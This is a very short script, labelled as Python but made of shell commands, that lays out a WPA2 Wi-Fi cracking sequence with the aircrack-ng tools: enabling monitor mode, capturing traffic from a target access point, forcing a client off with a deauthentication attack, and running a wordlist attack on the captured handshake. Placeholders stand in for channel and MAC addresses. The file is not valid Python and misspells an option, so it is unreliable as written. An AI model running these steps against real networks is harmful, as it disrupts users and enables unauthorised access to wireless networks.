#!/usr/bin/env python

import os

sudo airmon-ng
sudo airmon-ng start wlan1
sudo airodump-ng mon0
sudo airodump-ng -c CHANNEL --bsid MACADDRESS mon0 -w ~/wpa2crack

NEWTERMINAL
aireplay-ng -0 1 -a MACADDRESSACCESSPOINT -c MACADDRESSCLIENT mon0

aircrack-ng ~/wpa2crack-01.cap -w WORDLIST
